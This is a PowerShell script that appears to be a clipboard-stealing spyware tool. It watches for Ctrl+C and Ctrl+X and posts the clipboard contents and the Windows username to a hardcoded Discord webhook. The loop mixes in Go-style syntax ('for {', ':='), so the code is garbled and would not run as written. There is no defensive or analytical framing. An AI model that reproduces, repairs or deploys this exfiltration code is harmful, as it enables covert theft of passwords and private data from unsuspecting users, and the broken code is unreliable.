Add-Type -AssemblyName WindowsBase
	Add-Type -AssemblyName PresentationCore
	
	function dischat {
	
	  [CmdletBinding()]
	  param (    
	  [Parameter (Position=0,Mandatory = $True)]
	  [string]$con
	  ) 
	  
	  $hookUrl = 'https://discord.com/api/webhooks/1213786836598784012/dk1zfoVl_1rOxQqQ1Z2Z6Hr-xYMi4HKwsKO5cBpQvSoUvDJZBScoT-NGMROLTSz3R2ZH'
	  
	$Body = @{
	  'username' = $env:username
	  'content' = $con
	}
	
	
	Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body
	
	}
	
	
	dischat (get-clipboard)
	
	for {
		$Lctrl := [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
		$Rctrl := [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightCtrl)
		$cKey := [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::c)
		$xKey := [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::x)
	
		   if (($Lctrl -or $Rctrl) -and ($xKey -or $cKey)) {dischat (Get-Clipboard)}
		   elseif ($Rctrl -and $Lctrl) {dischat "---------connection lost----------";exit}
		   else {start-sleep -milliseconds 100}
	} 
